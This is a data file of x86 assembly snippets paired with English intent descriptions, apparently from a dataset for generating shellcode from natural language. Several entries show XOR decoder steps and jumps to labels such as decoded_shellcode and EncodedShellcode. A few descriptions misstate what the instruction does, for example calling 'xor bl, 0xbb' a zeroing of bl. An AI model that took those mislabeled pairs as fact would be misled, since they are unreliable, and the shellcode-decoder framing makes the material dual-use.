SNIPPETS	INTENTS
test eax, eax \n jz close	jump to the label close if the contents of the eax register is zero
test eax, eax \n jz close	if the contents of the eax register is zero then jump to the label close
test eax, eax \n jz close \n mov ebx, edx	jump to the label close if the contents of the eax register is zero else move the contents of the edx register into the ebx register
test eax, eax \n jz close \n mov ebx, edx	if the contents of the eax register is zero then jump to the label close else move the contents of the edx register into the ebx register
test eax, eax \n jz proc_name	jump to the label proc_name if the contents of the eax register is zero
test eax, eax \n jz proc_name	if the contents of the eax register is zero then jump to the label proc_name
test eax, eax \n jz ready_to_proxy	jump to the label ready_to_proxy if the contents of the eax register is zero
test eax, eax \n jz ready_to_proxy	if the contents of the eax register is zero then jump to the label ready_to_proxy
test eax, eax \n jz short loc_402B13	jump short to the memory location loc_402B13 if the contents of the eax register is zero
test eax, eax \n jz short loc_402B13	if the contents of the eax register is zero then jump short to the memory location loc_402B13
test eax, eax \n jz short loc_402C13	jump short to the memory location loc_402C13 if the contents of the eax register is zero
test eax, eax \n jz short loc_402C13	if the contents of the eax register is zero then jump short to the memory location loc_402C13
test eax, eax \n jz socket	jump to the label socket if the contents of the eax register is zero
test eax, eax \n jz socket	if the contents of the eax register is zero then jump to the label socket
test eax, eax \n jz socket \n xor eax, eax	jump to the label socket if the contents of the eax register is zero else zero out the contents of the eax register
test eax, eax \n jz socket \n xor eax, eax	if the contents of the eax register is zero then jump to the label socket else zero out the contents of the eax register
test eax, eax \n jz write \n xor eax, eax	jump to the label write if the contents of the eax register is zero, else zero out the contents of the eax register
test eax, eax \n jz write \n xor eax, eax	if the contents of the eax register is zero then jump to the label write else zero out the contents of the eax register
test ebx, ebx	test the contents of the ebx register
test ebx, ebx \n js short l1	jump short to the label l1 if the contents of the ebx register is negative
test ecx, ecx	test the contents of the ecx register
test edx, edx	test the contents of the edx register
test si, 01h	perform and operation between si and 01h
three:	declare the three label
todo:	declare the todo label
total_students equ 50	define constant total_students equal to 50
two:	declare the two label
two:	define two label
up:	declare the up label
var db 32	declare var byte variable and initialize it to 32
var db 64	declare a byte containing the value 64 at label the memory location var
var_a db 232	allocate one byte of memory for var_a variable and initialize it to 232
var_a: dd 0x0	create the doubleword variable var_a in memory and initialize it to zero
var_b db 'c'	allocate one byte of memory for var_b variable and initialize it to 'c'
var2 db ?	declare an uninitialized byte labeled var2
var2 db ?	declare an uninitialized byte referred to as location var2
variablename1: resb 1	reserve 1 byte for variableName1
variablename2: resw 1	reserve 1 word for variableName2
variablename3: resd 1	reserve 1 double word for variableName3
word_table dw 134, 345, 564, 123	declare the array of words word_table initialized to 134 345 564 and 123
word_value dw 300	define the word value word_value and initialize it to 300
word1 word 65535	define word1 unsigned word and initialize it to 65535
word2 sword –32768	define word2 signed word and initialize it to -32768
word3 word ?	define word3 uninitialized unsigned word
wordvar: resw 1	reserve a word for wordvar
wrap_around:	declare the wrap_around label
write_syscall equ 4	define write_syscall equal to 4
write:	declare the write label
writestring:	declare the writestring label
writestring:	define writestring function
x dw ?	declare a word uninitialized value referred to as location x
x dw ?	declare an uninitialized word labeled x
xchg [ebp+16], ecx	swap the address [ebp+16] with the contents of the ecx register
xchg [ebp+16], ecx	swap the contents in ebp+16 and ecx
xchg eax, ebx	exchange eax with ebx
xchg eax, ebx	swap the contents of eax and ebx
xchg eax, ebx	swap the contents of the eax register with the contents of the ebx register
xchg eax, ecx	swap the contents of the eax register with the contents of the ecx register
xchg eax, edx	swap the contents of the eax register with the contents of the edx register
xchg eax, esi	swap the contents of eax and esi
xchg eax, esi	swap the contents of the eax register with the contents of the esi register
xchg ebx, eax	exchange the contents of the ebx register with the contents of the eax register
xchg ebx, eax	swap the contents of the ebx register with the contents of the eax register
xchg ebx, eax	swap the values of ebx and eax
xchg ebx, eax	swap the values of ebx and eax registers
xchg ebx, ecx	exchange ebx with ecx
xchg ebx, edx	swap the contents of the ebx register with the contents of the edx register
xchg ebx, esp	swap the contents of the ebx register with the contents of the esp register
xchg ebx, esp	swap the values of ebx and esp registers
xchg ecx, edx	exchange ecx with edx
xchg ecx, edx	swap the contents of the ecx register with the contents of the edx register
xchg edi, eax	swap the contents of the edi register with the contents of the eax register
xchg edi, eax	swap the values of edi and eax registers
xchg edx, eax	exchange edx with eax
xchg edx, eax	swap the values of edx and eax registers
xchg edx, ebx	swap the values of edx and ebx registers
xchg esi, eax	swap the contents of the esi register with the contents of the eax register
xchg esi, eax	swap the values of esi and eax
xchg esi, ebx	swap the values of esi and ebx
xchg esp, esi	swap the values of esp and esi registers
xchg si, bx	swap the values si ebx and bx registers
xor [ebx], word __flag_byte	perform xor operation between ebx register and the word __flag_byte and save the result in ebx
xor [ecx + 116], bh	perform a logical xor between the address speicified by [ecx + 116] and the bh register and save the result in [ecx + 116]
xor [ecx + 116], bh	perform xor operation between the value stored at the location ecx+116 and bh
xor [ecx + 116], dh	perform a logical xor between the address speicified by [ecx + 116] and the dh register and save the result in [ecx + 116]
xor [ecx + 116], dh	perform xor operation between the value stored at the location ecx+116 and dh
xor [ecx], bh	perform the xor operation between the value stored at the location ecx and bh
xor [ecx], dh	perform the xor operation between the value stored at the location ecx and dh
xor ah, ah	clear the ah register
xor ah, ah	zero out ah register
xor al, 0e9h	perform a logical xor between the al register and 0e9h and save the result in al
xor al, 0x30	perform the xor operation between the al register and the value 0x30
xor al, 0x41	perform the xor operation between the al register and the value 0x41
xor al, 0x4a	perform the xor operation between the al register and the value 0x4a
xor ax, 0x3041	perform the xor operation between the ax register and the value 0x3041
xor ax, 0x4f73	perform the xor operation between the ax register and the value 0x4f73
xor ax, 0x539	perform a xor operation between ax and 0x539 and save the result in ax
xor ax, 0x539 \n jz decoded_shellcode	jump to the decoded_shellcode label if the result of the logical xor between the ax register and the value 0x539 is zero
xor ax, 0x7777	perform the xor operation between the contents of the ax register and the value 0x7777
xor ax, ax	clear the ax register
xor ax, ax	zero out ax register
xor ax, bx	perform a logical xor between the bx register and the ax register and save the result in ax
xor ax, bx \n jz call_decoded	jump to the call_decoded label if the result of the logical xor between the ax register and the bx register is zero
xor bl, 0xbb	perform a logical xor between the bl register and 0xbb and save the result in bl
xor bl, 0xbb	zero out bl register
xor bl, 0xBB \n jz encoded	jump to the encoded label if the result of the logical xor between the bl register and the value 0xBB is zero
xor bl, 0xBB \n jz formatting	jump to the formatting label if the result of the logical xor between the bl register and the value 0xBB is zero
xor bx, bx	initialize bx to 0
xor bx, bx	clear the bx register
xor bx,bx	zero out bx register
xor byte [esi + ecx - 1], 0x3	perform a logical xor between the byte at the address speicified by [esi + ecx - 1] and the bh register and save the result in [esi + ecx - 1]
xor byte [esi], 0x2c	perform the xor operation between the byte starting at the addess in esi and the value 0x2c
xor byte [esi], cl	perform a logical xor between the byte at the address specified by [esi] and the cl register and save the result in [esi]
xor byte [esi], cl	perform a xor operation between a byte in esi and cl
xor byte [esi+ecx],0x0f	perform the xor operation between the byte at memory location esi+ecx and 0x0f
xor cl, 0x32	perform the xor operation between cl and 0x32 and store the resut in cl
xor cl, 0x32 \n jz short EncodedShellcode	jump short to the EncodedShellcode label if the result of the logical xor between the cl register and the value 0x32 is zero
xor cl, 0xaa	perform a logical xor between the cl register and 0xaa and save the result in cl
xor cl, 0xaa	perform the xor operation between cl and 0xaa and store the result in cl
xor cl, 0xAA \n jnz Next_Cycle	jump to the Next_Cycle label if the result of the logical xor between the cl register and the value 0xAA is not zero
